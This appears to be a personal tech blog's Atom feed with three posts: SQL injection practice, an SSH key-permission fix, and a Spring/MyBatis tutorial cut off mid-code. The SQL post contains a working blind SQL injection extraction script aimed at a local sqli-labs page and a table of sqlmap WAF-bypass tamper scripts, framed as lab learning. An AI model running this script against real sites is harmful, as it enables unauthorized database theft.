<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[zzzZZZ]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://blog.qwerdf.com/"/>
  <updated>2018-04-09T17:37:05.186Z</updated>
  <id>http://blog.qwerdf.com/</id>
  
  <author>
    <name><![CDATA[xz]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[sql injection]]></title>
    <link href="http://blog.qwerdf.com/2018/04/06/sql/"/>
    <id>http://blog.qwerdf.com/2018/04/06/sql/</id>
    <published>2018-04-06T11:19:18.000Z</published>
    <updated>2018-04-09T17:37:05.186Z</updated>
    <content type="html"><![CDATA[<p>SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多.</p>
<p>SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐</p>
<h1 id="我选择IE6">我选择IE6</h1><p>有比在IE里面上网冲浪更快乐的事情么?<br><a id="more"></a></p>
<h1 id="我选择自写脚本">我选择自写脚本</h1><p>自写脚本更能针对化的对应环境,对于白盒测试<del>或者批量</del>值得使用.<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> fake_useragent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.get_table = <span class="string">"""select group_concat(distinct table_name) from """</span> + \</span><br><span class="line">                         <span class="string">"""information_schema.columns where table_schema=database()"""</span></span><br><span class="line">        self.get_database = <span class="string">"""select database()"""</span></span><br><span class="line">        self.get_version = <span class="string">"""select @@version"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success_by_boolen</span><span class="params">(get_url)</span>:</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    header = &#123;<span class="string">"User-Agent"</span>: ua.random&#125;</span><br><span class="line">    r = requests.get(get_url, headers=header)</span><br><span class="line">    success = <span class="string">"Your Login name"</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_success_by_time</span><span class="params">(get_url)</span>:</span></span><br><span class="line">    ua = fake_useragent.UserAgent()</span><br><span class="line">    header = &#123;<span class="string">"User-Agent"</span>: ua.random&#125;</span><br><span class="line">    before_time = time.time()</span><br><span class="line">    r = requests.get(get_url, headers=header)</span><br><span class="line">    after_time = time.time()</span><br><span class="line">    offset = after_time - before_time</span><br><span class="line">    success = <span class="number">8</span></span><br><span class="line">    <span class="keyword">if</span> success &lt; offset:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_fun</span><span class="params">(sql_fun)</span>:</span></span><br><span class="line">    url = <span class="string">r"""http://localhost/sqlilabs/practice/example1.php?id=1' and (&#123;0&#125;) --+"""</span></span><br><span class="line">    <span class="comment"># Timing-based Blind SQL Attacks</span></span><br><span class="line">    <span class="comment"># url = r"""http://localhost/sqlilabs/practice/example1.php?id=1' and if((&#123;0&#125;),sleep(10),0) --+"""</span></span><br><span class="line"></span><br><span class="line">    _long = -<span class="number">1</span></span><br><span class="line">    out = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">9999</span>, <span class="number">1</span>):</span><br><span class="line">        sql = <span class="string">"""LENGTH((&#123;0&#125;))=&#123;1&#125;"""</span>.format(sql_fun, i)</span><br><span class="line">        <span class="keyword">if</span> is_success_by_boolen(url.format(sql)):</span><br><span class="line">            _long = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, _long, <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.printable:<span class="comment">#<span class="doctag">TODO:</span> 二分法优化</span></span><br><span class="line">            sql = <span class="string">"""(substr((&#123;0&#125;),&#123;1&#125;,1))=("&#123;2&#125;")"""</span>.format(sql_fun, i, j)</span><br><span class="line">            <span class="keyword">if</span> is_success_by_boolen(url.format(sql)):</span><br><span class="line">                out += <span class="string">''</span> + j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"&#123;0&#125;:  &#123;1&#125;"</span>.format(Example().get_version, sql_fun(Example().get_version))</span><br></pre></td></tr></table></figure></p>
<h1 id="我选择sqlmap">我选择sqlmap</h1><p>sqlmap内置有万能的脚本,对于黑盒测试值得使用.</p>
<table>
<thead>
<tr>
<th>脚本</th>
<th>直译</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>apostrophemask</td>
<td>单引号伪装</td>
<td>使用<em>UTF-8</em></td>
</tr>
<tr>
<td>apostrophenullencode</td>
<td>单引号null编码</td>
<td>用双字节的unicode字符</td>
</tr>
<tr>
<td>appendnullbyte</td>
<td>尾部添加null字节</td>
<td></td>
</tr>
<tr>
<td>base64encode</td>
<td>base64编码</td>
</tr>
<tr>
<td>between</td>
<td>即<em>between</em></td>
<td>替换 <em>&lt;</em> <em>=</em> <em>&gt;</em></td>
</tr>
<tr>
<td>bluecoat</td>
<td>bypass Blue Coat Systems</td>
<td>老外的公司</td>
</tr>
<tr>
<td>chardoubleencode</td>
<td>字符两次编码</td>
<td>即两次url编码</td>
</tr>
<tr>
<td>charencode</td>
<td>…</td>
<td></td>
</tr>
<tr>
<td>charunicodeencode</td>
<td>字符unicode编码</td>
<td>即 <em>%uxxxx</em> 编码</td>
</tr>
<tr>
<td>charunicodeescape</td>
<td>字符unicode转义</td>
<td>即 <em>\uxxxx</em> 编码</td>
</tr>
<tr>
<td>commalessmid</td>
<td>mid更少的逗号</td>
<td>MID(A,B,C) –&gt; MID(A FROM B FOR C)</td>
</tr>
<tr>
<td>commalesslimit</td>
<td>limit更少的逗号</td>
<td>LIMIT M, N –&gt; LIMIT N OFFSET M</td>
</tr>
<tr>
<td>commentbeforeparentheses</td>
<td>括号之前注释</td>
<td></td>
</tr>
<tr>
<td>concat2concatws</td>
<td>concat –&gt; concat_ws</td>
<td></td>
</tr>
<tr>
<td>equaltolike</td>
<td><em>=</em> –&gt; <em>like</em></td>
<td></td>
</tr>
<tr>
<td>escapequotes</td>
<td>转义引号</td>
<td>引号前面加 <strong>\\</strong>  (意义?)</td>
</tr>
<tr>
<td>greatest</td>
<td>GREATEST()</td>
<td>返回参数的最大值,用于替换<em>and</em>后的 <em>&gt;</em></td>
</tr>
<tr>
<td>halfversionedmorekeywords</td>
<td><em>更多的关键字在一半的版本上</em>(?)</td>
<td>即加注释,如 <em>/\</em>!0UNION*<br>(MySQL &lt; 5.1)</td>
</tr>
<tr>
<td>htmlencode</td>
<td>html编码</td>
<td>即 <em>&#xx;</em> 编码</td>
</tr>
<tr>
<td>ifnull2casewhenisnull</td>
<td>IFNULL() –&gt;CASE WHEN ISNULL()</td>
<td>没见过的操作</td>
</tr>
<tr>
<td>ifnull2ifisnull</td>
<td>IFNULL()–&gt;IF ISNULL()</td>
<td>…</td>
</tr>
<tr>
<td>informationschemacomment</td>
<td>information_schema注释</td>
<td>information_schema/**/.table</td>
</tr>
<tr>
<td>least</td>
<td>LEAST()</td>
<td>返回参数的最小值,用于替换<em>and</em>后的 <em>&gt;</em></td>
</tr>
<tr>
<td>lowercase</td>
<td>小写</td>
<td></td>
</tr>
<tr>
<td>modsecurityversioned</td>
<td><em>ModSecurity版本</em>(?)</td>
<td>开源的WAF</td>
</tr>
<tr>
<td>modsecurityzeroversioned</td>
<td><em>ModSecurity零版本</em>(?)</td>
<td>..</td>
</tr>
<tr>
<td>multiplespaces</td>
<td>多个空格</td>
<td>就是瞎鸡儿加空格</td>
</tr>
<tr>
<td>nonrecursivereplacement</td>
<td>非递归替换</td>
<td>union –&gt; uni<strong>union</strong>on</td>
</tr>
<tr>
<td>overlongutf8</td>
<td>超长的UTF-8</td>
<td>即 <em>%xx%xx</em> 编码(不转换字母)</td>
</tr>
<tr>
<td>overlongutf8more</td>
<td>更长的UTF-8</td>
<td>即 <em>%xx%xx</em> 编码…(转换字母)</td>
</tr>
<tr>
<td>percentage</td>
<td>百分号</td>
<td>select –&gt; S%E%L%E%C%T</td>
</tr>
<tr>
<td>plus2concat</td>
<td>+ –&gt; CONCAT()</td>
<td>适用于(char(x)+char(x))</td>
</tr>
<tr>
<td>plus2fnconcat</td>
<td>+ –&gt; {fn CONCAT()}</td>
<td>ODBC only</td>
</tr>
<tr>
<td>randomcase</td>
<td>随机大小写</td>
<td></td>
</tr>
<tr>
<td>randomcomments</td>
<td>随机注释</td>
<td><strong>/**/</strong></td>
</tr>
<tr>
<td>securesphere</td>
<td>SecureSphere</td>
<td>WAF</td>
</tr>
<tr>
<td>sp_password</td>
<td>sp_password</td>
<td>日志</td>
</tr>
<tr>
<td>space2*</td>
<td>spacee -&gt; *</td>
</tr>
<tr>
<td>symboliclogical</td>
<td>逻辑符号</td>
<td>AND/OR -&gt; &amp;&amp;/\</td>
<td>\</td>
<td></td>
<td></td>
</tr>
<tr>
<td>unionalltounion</td>
<td>union all -&gt; union</td>
<td></td>
</tr>
<tr>
<td>unmagicquotes</td>
<td>魔术引号</td>
<td>即%bf%27,神奇的<strong>縗’</strong></td>
</tr>
<tr>
<td>uppercase</td>
<td>大写</td>
<td></td>
</tr>
<tr>
<td>varnish</td>
<td>Varnish</td>
<td>WAF</td>
</tr>
<tr>
<td>versionedkeywords</td>
<td><em>版本的关键字</em>(?)</td>
<td>即/!*select/,不包括函数</td>
</tr>
<tr>
<td>versionedmorekeywords</td>
<td><em>更多的版本的关键字</em>(?)</td>
<td>即/!*select/,包括函数</td>
</tr>
<tr>
<td>xforwardedfor</td>
<td>X-Forwarded-For</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="我选择”啊D”">我选择”啊D”</h1><p>是…是大佬呢…</p>
<!--小弟我对大佬你的景仰犹如滔滔江水连绵不绝又如黄河泛滥一发不可收拾天地可证日月可鉴。-->
<h1 id="参考链接:"><h4>参考链接:</h4></h1><p><a href="https://mariadb.com/kb/en/library/string-functions/" target="_blank" rel="external">Sql中操纵字符串的函数方法</a></p>
<p><a href="https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423" target="_blank" rel="external">SQLMap Tamper Scripts (SQL Injection and WAF bypass)</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>SQL注入,问题经常来源于sql语句字符串拼接的时候未作过滤,其中世界上最好的语言之一——PHP——出现的问题最多.</p>
<p>SQl注入通常用于在线管理自己的数据库👌,臃肿的PhpMyAdmin,需要下载的数据库连接软件.哪里有直接抄起键盘在地址栏直接输入就能管理来的快乐</p>
<h1 id="我选择IE6">我选择IE6</h1><p>有比在IE里面上网冲浪更快乐的事情么?<br>]]>
    
    </summary>
    
      <category term="security" scheme="http://blog.qwerdf.com/tags/security/"/>
    
      <category term="sql" scheme="http://blog.qwerdf.com/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[记一次诡异的ssh密钥登录失败]]></title>
    <link href="http://blog.qwerdf.com/2018/03/31/unable-login-SSH-with-key/"/>
    <id>http://blog.qwerdf.com/2018/03/31/unable-login-SSH-with-key/</id>
    <published>2018-03-30T16:21:55.000Z</published>
    <updated>2018-03-30T19:03:24.603Z</updated>
    <content type="html"><![CDATA[<p>问基友要了台服务器,密码与密钥均不能登陆.改了密码后可以登陆,但密钥依然不能登陆.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_19_31_centos ~]<span class="comment"># ls -al                               </span></span><br><span class="line">total <span class="number">80</span>                                                       </span><br><span class="line">drwxrwxrwx.  <span class="number">3</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .                  </span><br><span class="line">dr-xr-xr-x. <span class="number">24</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">51</span> ..</span><br><span class="line">-rwxrwxrwx   <span class="number">1</span> root root   <span class="number">790</span> Mar <span class="number">31</span> <span class="number">00</span>:<span class="number">07</span> .bash_<span class="built_in">history</span>      </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root    <span class="number">18</span> May <span class="number">20</span>  <span class="number">2009</span> .bash_<span class="built_in">logout</span>       </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">176</span> May <span class="number">20</span>  <span class="number">2009</span> .bash_profile      </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">176</span> Sep <span class="number">23</span>  <span class="number">2004</span> .bashrc            </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">100</span> Sep <span class="number">23</span>  <span class="number">2004</span> .cshrc             </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root <span class="number">12754</span> Dec <span class="number">25</span>  <span class="number">2014</span> install.log        </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root  <span class="number">5520</span> Dec <span class="number">25</span>  <span class="number">2014</span> install.log.syslog      </span><br><span class="line">drwxrwxrwx   <span class="number">2</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .ssh               </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">129</span> Dec  <span class="number">4</span>  <span class="number">2004</span> .tcshrc            </span><br><span class="line">-rwxrwxrwx   <span class="number">1</span> root root  <span class="number">1005</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .viminfo           </span><br><span class="line">[root@VM_19_31_centos ~]<span class="comment"># cd .ssh/</span></span><br><span class="line">[root@VM_19_31_centos .ssh]<span class="comment"># ls -al                            </span></span><br><span class="line">total <span class="number">12</span>                                                       </span><br><span class="line">drwxrwxrwx  <span class="number">2</span> root root <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .                    </span><br><span class="line">drwxrwxrwx. <span class="number">3</span> root root <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> ..                   </span><br><span class="line">-rwxrwxrwx  <span class="number">1</span> root root <span class="number">1157</span> Mar <span class="number">31</span> <span class="number">00</span>:<span class="number">08</span> authorized_keys</span><br></pre></td></tr></table></figure>
<p>明显<em>.ssh/</em>与<em>authorized_keys</em>权限设置错误,改之</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> ~/.ssh</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>退出登录,然而依然不能用密钥登陆…<br><a id="more"></a><br>猜测是<em>sshd</em>配置问题.去sshd_config查看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#RSAAuthentication yes</span></span><br><span class="line"><span class="comment">#PubkeyAuthentication yes</span></span><br><span class="line"><span class="comment">#AuthorizedKeysFile       .ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>
<p>取消注释,重启sshd服务,退出登录,问题依旧……<br>谷歌之,用<em>ssh -vv server</em>来查看登陆日志,发现报<em>we did not send a packet, disable method</em><br><img src="/uploads/2018-03-31_1.png" alt="we did not send a packet, disable method"><br>谷歌之,发现是<em>~</em>的权限设置<a href="https://unix.stackexchange.com/questions/205842/unable-to-login-with-ssh-rsa-key" target="_blank" rel="external">问题</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">755</span> ~</span><br></pre></td></tr></table></figure>
<p>退出登录,问题解决😂</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>问基友要了台服务器,密码与密钥均不能登陆.改了密码后可以登陆,但密钥依然不能登陆.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_19_31_centos ~]<span class="comment"># ls -al                               </span></span><br><span class="line">total <span class="number">80</span>                                                       </span><br><span class="line">drwxrwxrwx.  <span class="number">3</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .                  </span><br><span class="line">dr-xr-xr-x. <span class="number">24</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">51</span> ..</span><br><span class="line">-rwxrwxrwx   <span class="number">1</span> root root   <span class="number">790</span> Mar <span class="number">31</span> <span class="number">00</span>:<span class="number">07</span> .bash_<span class="built_in">history</span>      </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root    <span class="number">18</span> May <span class="number">20</span>  <span class="number">2009</span> .bash_<span class="built_in">logout</span>       </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">176</span> May <span class="number">20</span>  <span class="number">2009</span> .bash_profile      </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">176</span> Sep <span class="number">23</span>  <span class="number">2004</span> .bashrc            </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">100</span> Sep <span class="number">23</span>  <span class="number">2004</span> .cshrc             </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root <span class="number">12754</span> Dec <span class="number">25</span>  <span class="number">2014</span> install.log        </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root  <span class="number">5520</span> Dec <span class="number">25</span>  <span class="number">2014</span> install.log.syslog      </span><br><span class="line">drwxrwxrwx   <span class="number">2</span> root root  <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .ssh               </span><br><span class="line">-rwxrwxrwx.  <span class="number">1</span> root root   <span class="number">129</span> Dec  <span class="number">4</span>  <span class="number">2004</span> .tcshrc            </span><br><span class="line">-rwxrwxrwx   <span class="number">1</span> root root  <span class="number">1005</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .viminfo           </span><br><span class="line">[root@VM_19_31_centos ~]<span class="comment"># cd .ssh/</span></span><br><span class="line">[root@VM_19_31_centos .ssh]<span class="comment"># ls -al                            </span></span><br><span class="line">total <span class="number">12</span>                                                       </span><br><span class="line">drwxrwxrwx  <span class="number">2</span> root root <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> .                    </span><br><span class="line">drwxrwxrwx. <span class="number">3</span> root root <span class="number">4096</span> Mar <span class="number">30</span> <span class="number">23</span>:<span class="number">50</span> ..                   </span><br><span class="line">-rwxrwxrwx  <span class="number">1</span> root root <span class="number">1157</span> Mar <span class="number">31</span> <span class="number">00</span>:<span class="number">08</span> authorized_keys</span><br></pre></td></tr></table></figure>
<p>明显<em>.ssh/</em>与<em>authorized_keys</em>权限设置错误,改之</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod <span class="number">700</span> ~/.ssh</span><br><span class="line">chmod <span class="number">600</span> ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>退出登录,然而依然不能用密钥登陆…<br>]]>
    
    </summary>
    
      <category term="linux" scheme="http://blog.qwerdf.com/tags/linux/"/>
    
      <category term="shell" scheme="http://blog.qwerdf.com/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[SSM]]></title>
    <link href="http://blog.qwerdf.com/2018/03/16/ssm/"/>
    <id>http://blog.qwerdf.com/2018/03/16/ssm/</id>
    <published>2018-03-16T06:13:38.000Z</published>
    <updated>2018-03-30T19:22:56.637Z</updated>
    <content type="html"><![CDATA[<h1 id="SSM:">SSM:</h1><p>即是<strong>S</strong>pring <strong>S</strong>pringMVC <strong>M</strong>ybatis的开头字母</p>
<h1 id="Spring">Spring</h1><p><img src="https://docs.spring.io/spring/docs/4.3.14.RELEASE/spring-framework-reference/htmlsingle/images/spring-overview.png" alt="Spring Framework Runtime"></p>
<p><strong>S</strong>SM里的Spring其实主要常用的是IoC和Aop,还有Test</p>
<ul>
<li>Spring默认的xml配置文件为 <em>applicationContext.xml</em></li>
</ul>
<h2 id="Spring_IoC">Spring IoC</h2><p>中文译名:控制反转/依赖注入,简单来说,即是原来的<code>new xxx();</code>用spring中content的bean代替,实现在构造函数的时候自动注入参数,有三种配置方式:基于xml,基于注解,基于java类,有三种注入方式:构造注入,set注入,工厂注入(不常用).<br><a id="more"></a></p>
<h3 id="基于xml的配置">基于xml的配置</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--标识符(identifiers)即bean的身份标识--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--若不设定id与name,则以name-generator的规则命名,默认为小写开头的非限定类名--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--若设定了id(一般情况),则id为标识符--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--若没设定,则name的第一个字符串作为标识符--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"info"</span> <span class="attribute">name</span>=<span class="value">"informationX,name2"</span> <span class="attribute">class</span>=<span class="value">"com.test.InformationX"</span> /&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;bean id="nameX" value="lester"&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--setter注入,human需要有setname()&amp;setinfo()--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"human"</span> <span class="attribute">class</span>=<span class="value">"com.test.pojo.human"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"name"</span> <span class="attribute">value</span>=<span class="value">"lester"</span> /&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="title">property</span> <span class="attribute">name</span>=<span class="value">"info"</span> <span class="attribute">ref</span>=<span class="value">"info"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--构造注入,man需要有man(human h,int age)--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">bean</span> <span class="attribute">id</span>=<span class="value">"man"</span> <span class="attribute">class</span>=<span class="value">"com.test.pojo.man"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">constructor</span> <span class="attribute">ref</span>=<span class="value">"human"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">constructor</span> <span class="attribute">value</span>=<span class="value">"10"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="基于注解的配置">基于注解的配置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Component</span>  <span class="comment">//自动生成Bean. 与@Repository(用于DAO),@Service(用于Service),@Controller(用于Controller)作用相同</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">human</span></span>&#123;</span><br><span class="line">    <span class="annotation">@Autowired</span>  <span class="comment">//@Resource,@Inject原生标准注解也能识别,作用也差不多</span></span><br><span class="line">    <span class="annotation">@Qualifier</span>(<span class="string">"info"</span>) <span class="comment">//若不能自动识别即可指定注入内容</span></span><br><span class="line">    <span class="keyword">private</span> InformationX infoX;</span><br><span class="line">    <span class="annotation">@Autowired</span>      <span class="comment">//此处注解后无需setNameX函数了</span></span><br><span class="line">    <span class="keyword">private</span> String nameX;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">human</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//@AutoWired     即可在变量上进行注解(无需setter函数),也可在setter方法上进行注解</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNameX</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nameX=s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//@Required     若设置Required则表示此变量必须在xml配置文件中进行配置</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setInfomationX</span><span class="params">(InfomationX x)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.infoX=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//========================================================</span></span><br><span class="line">    <span class="comment">// 也可以在构造函数上注入</span></span><br><span class="line">    <span class="annotation">@Autowired</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">human</span><span class="params">(String s,@Qualifier(<span class="string">"info"</span>)</span>InfomationX x)</span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nameX=s;</span><br><span class="line">        <span class="keyword">this</span>.infoX=x;</span><br><span 